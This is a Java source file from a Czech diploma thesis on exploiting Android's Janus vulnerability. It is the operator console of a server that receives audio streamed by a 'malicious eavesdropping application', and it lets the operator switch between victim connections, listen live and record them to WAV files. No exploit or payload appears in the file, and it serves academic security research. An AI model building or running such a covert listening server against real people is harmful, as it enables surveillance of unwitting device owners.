// Tento kód je součást diplomové práce "Využití zranitelnosti Janus na operačním systému Android"
// Autor: Bc. Vít Souček (soucevi1@fit.cvut.cz)
//
// Použité zdroje:
//    - zmíněné v dokumentačních komentářích

package com.company;

import java.util.Scanner;

class Server {
    private static ServerThread thread;
    private static int maxMemorySize = 10;
    private static int threadCount = 2;
    private static int maxConnectionCount = -1;

    /**
     * Vstupní bod programu.
     * <p>
     * Inicializuje hlavni vlákno serveru, ukáže nápovědu
     * a poté načítá a interpretuje vstup uživatele.
     *
     * @param args Dva argumenty -- maximální povolená paměť pro přednahrávání jednotlivých spojení
     *             a počet vláken, která budou zpracovávat přijatá data.
     */
    public static void main(String[] args) {

        parseArguments(args);
        System.out.println("[*] Max memory to use per connection: " + maxMemorySize + " MB");
        System.out.println("[*] Number of threads: " + threadCount);
        String conns = maxConnectionCount == -1 ? "unlimited" : Integer.toString(maxConnectionCount);
        System.out.println("[*] Max number of connections: " + conns);

        thread = new ServerThread(maxMemorySize, threadCount, maxConnectionCount);
        thread.start();

        showWelcomeScreen();

        Scanner input = new Scanner(System.in);

        boolean status = true;

        while (status) {
            String connectionID;
            System.out.print("> ");
            String option = input.next();
            switch (option) {
                case "l":
                    listConnections();
                    break;
                case "s":
                    connectionID = input.next();
                    switchToConnection(connectionID);
                    break;
                case "d":
                    connectionID = input.next();
                    removeConnection(connectionID);
                    break;
                case "q":
                    status = false;
                    thread.status = false;
                    break;
                case "r":
                    connectionID = input.next();
                    startRecording(connectionID);
                    break;
                case "c":
                    connectionID = input.next();
                    stopRecording(connectionID);
                    break;
                case "h":
                    showHelp();
                    break;
                default:
                    System.out.println("[X] Unknown command: " + option);
            }
        }
        System.out.println("[*] Exiting the application");
        System.exit(0);
    }

    /**
     * Načtení argumentu z příkazové řádky
     *
     * @param args Pole řetězců s argumenty
     */
    private static void parseArguments(String[] args) {
        if (args.length == 0) {
            System.out.println("[*] Using default parameter values");
        } else if (args.length == 6 || args.length == 4 || args.length == 2) {
            for (int i = 0; i < args.length; i += 2) {
                switch (args[i]) {
                    case "-t":
                        int tc = Integer.parseInt(args[i + 1]);
                        if (tc < 1) {
                            System.out.println("[X] Argument THREAD_CNT must be >= 1!");
                            showUsage();
                            System.exit(0);
                        }
                        threadCount = tc;
                        break;
                    case "-m":
                        int mm = Integer.parseInt(args[i + 1]);
                        if (mm < 1) {
                            System.out.println("[X] Argument MAX_MEM must be >= 1");
                            showUsage();
                            System.exit(0);
                        }
                        maxMemorySize = mm;
                        break;
                    case "-h":
                        showUsage();
                        System.exit(0);
                        break;
                    case "-c":
                        int cc = Integer.parseInt(args[i + 1]);
                        if (cc < 1 && cc != -1) {
                            System.out.println("[X] Argument MAX_CONN must be >= 1 or -1 for unlimited");
                            showUsage();
                            System.exit(0);
                        }
                        maxConnectionCount = cc;
                        break;
                    default:
                        System.out.println("[X] Unknown argument");
                        showUsage();
                        System.exit(0);
                }
            }
        } else {
            System.out.println("[X] Wrong number of arguments!");
            showUsage();
            System.exit(0);
        }
    }

    /**
     * Ukáže text s návodem ke spuštění aplikace.
     */
    private static void showUsage() {
        System.out.println("Usage:");
        System.out.println("- default parameters: $ java com.company.Server");
        System.out.println("- custom parameters:  $ java com.company.Server -t <THREAD_CNT> -m <MAX_MEM> -c <MAX_CONN>");
        System.out.println("  THREAD_CNT -- number of threads the application will run with (default: " + threadCount + ")");
        System.out.println("  MAX_MEM -- max memory (in MB) allocated for pre-recording one connection (default: " + maxMemorySize + ")");
        System.out.println("  MAX_CONN -- max number of connections accepted at the same time (default: " + maxConnectionCount + ")");
    }

    /**
     * Zastaví nahrávání spojení předaného v parametru
     * <p>
     * Pokud connectionID je "a" nebo "active", nahradí
     * ho ID aktivního spojení.
     *
     * @param connectionID ID spojení, které má být zastaveno.
     */
    private static void stopRecording(String connectionID) {
        if (connectionID.equals("a") || connectionID.equals("active")) {
            connectionID = thread.activeConnection.get();
            if (connectionID.equals("")) {
                System.out.println("[X] No active connection, cannot stop recording it");
                return;
            }
        }

        if (!verifyConnectionFormat(connectionID))
            return;

        Connection toStop = thread.connections.get(connectionID);
        if (toStop != null)
            toStop.stopRecording();
        else
            System.out.println("[X] Connection with this ID not found");
    }

    /**
     * Začne nahrávat spojení předané v parametru
     * Pokud connectionID je "a" nebo "active", nahradí
     * ho ID aktivního spojení.
     *
     * @param connectionID ID spojení, které má být nahráváno
     */
    private static void startRecording(String connectionID) {
        if (connectionID.equals("a") || connectionID.equals("active")) {
            connectionID = thread.activeConnection.get();
            if (connectionID.equals("")) {
                System.out.println("[X] No active connection to record");
                return;
            }
        }

        if (!verifyConnectionFormat(connectionID))
            return;

        Connection toRecord = thread.connections.get(connectionID);
        if (toRecord != null)
            toRecord.startRecording();
        else
            System.out.println("[X] Connection with this ID not found");
    }

    /**
     * Odebere spojení předané v parametru ze seznamu všech spojení.
     *
     * @param connectionID Spojení, které má být odebráno
     */
    private static void removeConnection(String connectionID) {
        if (connectionID.equals("a") || connectionID.equals("active"))
            connectionID = thread.activeConnection.get();

        if (verifyConnectionFormat(connectionID)) {
            thread.removeConnection(connectionID, true);
        }
    }

    /**
     * Kontroluje, jestli ID spojení z parametru má správný formát
     * <p>
     * Korektní ID spojení vždy má následující tvar:
     * IP:port
     * <p>
     * Kromě formátu je kontrolována platnost IP adresy (0-255) a portu (0-65535)
     * <p>
     * Inspirováno odpovědí na otázku "Validate IPv4 address in Java" na StackOverflow.
     * autor odpovědi: Akarshit Wal
     * dostupné z: https://stackoverflow.com/a/30691451/6136143
     *
     * @param connectionID ID spojení, které má být ověřeno
     * @return True pokud je ID platné, jinak false
     */
    private static boolean verifyConnectionFormat(String connectionID) {
        String[] split_conn = connectionID.split(":");

        if (split_conn.length != 2) {
            System.out.println("[X] Connection in wrong format: " + connectionID + ". Should be: IP:port");
            return false;
        }

        String ip = split_conn[0];
        int port = Integer.parseInt(split_conn[1]);

        String pattern = "^((0|1\\d?\\d?|2[0-4]?\\d?|25[0-5]?|[3-9]\\d?)\\.){3}(0|1\\d?\\d?|2[0-4]?\\d?|25[0-5]?|[3-9]\\d?)$";
        if (!ip.matches(pattern)) {
            System.out.println("[X] IP address is not valid: " + ip);
            return false;
        }

        if (port > 65535 || port < 0) {
            System.out.println("[X] Invalid port number: " + port);
            return false;
        }
        return true;
    }

    /**
     * Spojení předané v parametru nastaví jako aktivní
     * <p>
     * ID spojení je nejprve ověřeno.
     *
     * @param connectionID ID spojení, které má být aktivní
     */
    private static void switchToConnection(String connectionID) {
        if (verifyConnectionFormat(connectionID)) {
            if (!thread.connections.containsKey(connectionID)) {
                System.out.println("[X] The connection does not exist");
                return;
            }
            System.out.println("[*] Connection " + connectionID + " set as active. Replaced " + thread.activeConnection);
            thread.activeConnection.set(connectionID);
        }
    }

    /**
     * Vypíše seznam všech aktuálních spojení.
     */
    private static void listConnections() {
        System.out.println("----------------------------------------");
        System.out.println("Active connection: " + thread.activeConnection);
        System.out.println("----------------------------------------");
        System.out.println("Other connections: ");
        for (String connectionID : thread.connections.keySet()) {
            if (!connectionID.equals(thread.activeConnection.get()))
                System.out.println(" - " + connectionID);
        }
    }

    /**
     * Vypíše návod k použití.
     */
    private static void showHelp() {
        System.out.println();
        System.out.println("USAGE:");
        System.out.println("======");
        System.out.println("l: List all available connections");
        System.out.println("   This option lists all connection that are known to the server.");
        System.out.println("   The server automatically saves a connection to the list when it");
        System.out.println("     receives some data from the connection.");
        System.out.println();
        System.out.println("s <CONNECTION>: Switch to chosen connection");
        System.out.println("                Make this connection active -- data from this connection");
        System.out.println("                  will be played on the speaker.");
        System.out.println("                Example: s 192.168.1.100:12345");
        System.out.println();
        System.out.println("d <CONNECTION>: Delete selected connection");
        System.out.println("                Once you receive no data from a connection, you can manually");
        System.out.println("                  remove it from the list.");
        System.out.println("                Example: r 192.168.1.100:12345");
        System.out.println();
        System.out.println("r <CONNECTION>: Start recording the connection");
        System.out.println("   The recording will be saved in current directory as <connection>_<timestamp>.wav");
        System.out.println();
        System.out.println("c <CONNECTION>: Stop recording the active connection");
        System.out.println();
        System.out.println("q: Quit this application.");
        System.out.println();
        System.out.println("h: Show this help");
        System.out.println();
        System.out.println("<CONNECTION> can be either a string in format IP:port or a letter 'a' for a connection that is active at the time (except for the 's' command)");
    }

    /**
     * Vypíše uvítací obrazovku.
     */
    private static void showWelcomeScreen() {
        System.out.println("   ___                         _____                          \n" +
                "  |_  |                       /  ___|                         \n" +
                "    | | __ _ _ __  _   _ ___  \\ `--   ___ _ ____   _____ _ __ \n" +
                "    | |/ _` | '_ \\| | | / __|  `--  \\/ _ \\ '__\\ \\ / / _ \\ '__|\n" +
                "/\\__/ / (_| | | | | |_| \\__ \\ /\\__/ /  __/ |   \\ V /  __/ |   \n" +
                "\\____/ \\__,_|_| |_|\\__,_|___/ \\____/ \\___|_|    \\_/ \\___|_|  \n" +
                "\n" +
                "             MMMMMMMMMMMMMM      Server program created to receive\n" +
                "          IMMMMMMMMMMMMMMMMMM     data from the malicious eavesdropping\n" +
                "         MMMMMMMMMMMMMMMMMMMMM     application installed on an Android device.\n" +
                "        MMMMMMMMMMMMMMMMMMMMMMM         \n" +
                "       ,MMMMMMMMMMMMMMMMMMMMMMMM   This program is a part of the diploma thesis\n" +
                "       MMMMMMMMMMMMMMMMMMMMMMMMM        \n" +
                "       MMMMMMMMMMMMMMMMMMMMMMMMM   -------------------------------\n" +
                "       MMMMMMMMMMMMMMMMMMMMMMMMM   \"Exploiting Janus vulnerability\n" +
                "        MMM~     DMMMMMM  +MMMMM          on Android OS\"   \n" +
                "        MMM       IMM       MMM    -------------------------------\n" +
                "         MMM      M=NM      DM,    Author: inserthackernamehere, 2020\n" +
                "          MMMMM MMM  MMM   MMM          \n" +
                "          MMMMMMMM    MMMMMMMM   If you want to change the limits on used memory,\n" +
                "          MMMMMMMM, M,MMMMMMMM   threads used, and max connection accepted,\n" +
                "             ,MMMMMMMMMMMMMMM    relaunch the program with arguments:\n" +
                "            ? MMMMMMMMMMM               \n" +
                "             +   MMMMM +         -t <THR_CNT> -m <MAX_MEM> -c <MAX_CONN>\n" +
                "             MD         MM              _______\n" +
                "             MMMMM,M MMMMM              |USAGE:|________________________________\n" +
                "              MMMMMMMMMMMM              | h        - show help\n" +
                "                MMMMMMMN        7MMM    | l        - list available connections\n" +
                "  MMMMMMMMM        :       MMMMMMMMMMM  | s <CONN> - listen to connection <CONN>\n" +
                " MMMMMMMMMMMMMMM      OMMMMMMMMMMM    M | d <CONN> - delete <CONN> from the list\n" +
                "MMMMM  MMMMMMMMMMM=MMMMMMMMMMMMM MMMMMM |            of connections\n" +
                "MMMMMMM MM     $MMMMMMM8     MM MMMMMM  | r <CONN> - Start recording <CONN>\n" +
                "  MMMMMM M   MMMMMMMDMMMMMM   MMMMMMM   | c <CONN> - Stop recording <CONN>,\n" +
                "    MMMMN MMMMMMM     MMMMMMMI          |            save to file\n" +
                "        MMMMMMM         ,MMMMMMM        | q        - quit application\n" +
                "      MMMMMMMMM         MMMMMMMMM8      | \n" +
                "      MMMM  MMMM         MMM  MMMM      | <CONN> can either be a connection\n" +
                "      MM NMMMMMM        MMMMMMIZMM      | identifier in format IP:port or\n" +
                "      MMMMMMMMM          MMMMMM~M       | a letter 'a' for connection that\n" +
                "       MMMMMM              MMMMM        | is active at the time.\n");
    }
}

